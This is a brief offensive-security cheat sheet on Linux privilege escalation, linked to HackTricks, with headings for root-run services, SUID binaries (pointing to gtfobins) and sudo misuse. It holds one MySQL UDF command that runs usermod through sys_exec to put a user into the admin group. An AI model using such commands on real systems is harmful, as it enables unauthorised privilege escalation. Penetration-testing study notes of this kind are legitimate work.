# Linux - Privilege Escalation
<!-- https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-command-suid-binary-without-command-path -->



## Services run as root

### MySql

#### UDF

```
select sys_exec("usermod -add -G admin john");
```

## SUID binaries

gtfobins.github.io

## Sudo command/SUID binary without command path